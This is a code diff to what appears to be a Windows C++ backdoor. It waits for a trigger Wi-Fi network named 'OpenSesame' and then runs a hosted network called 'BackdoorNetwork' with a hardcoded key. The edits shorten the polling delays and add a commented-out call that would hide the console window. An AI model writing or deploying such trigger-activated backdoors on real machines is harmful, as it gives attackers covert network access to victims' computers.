@@ -11,10 +11,12 @@
 
 int _tmain( int argc, _TCHAR* argv [] )
 {
-    const char * ssid = "HG";
+    const char * ssid = "OpenSesame";
     const char * hostedNetworkSsid = "BackdoorNetwork";
     const char * hostedNetworkKey = "abcd12345";
     Wlan wlan;
+	
+	//FreeConsole();
 
     while (true) {
         std::wcout << _T( "scanning..." ) << std::endl;
@@ -28,8 +30,8 @@ int _tmain( int argc, _TCHAR* argv [] )
 
 				while (true) {
 					
-					std::wcout << _T("sleeping 10 seconds") << std::endl;
-					Sleep(10 * 1000);
+					std::wcout << _T("sleeping 5 seconds") << std::endl;
+					Sleep(5 * 1000);
 
 					if (!wlan.IsNetAvailable(ssid)) {
 
@@ -49,8 +51,8 @@ int _tmain( int argc, _TCHAR* argv [] )
             }
         }
 
-        std::wcout << _T( "waiting 60 seconds..." ) << std::endl;
-        Sleep( 60 * 1000 );
+        std::wcout << _T( "waiting 5 seconds..." ) << std::endl;
+        Sleep( 5 * 1000 );
     }
 
     return 0;
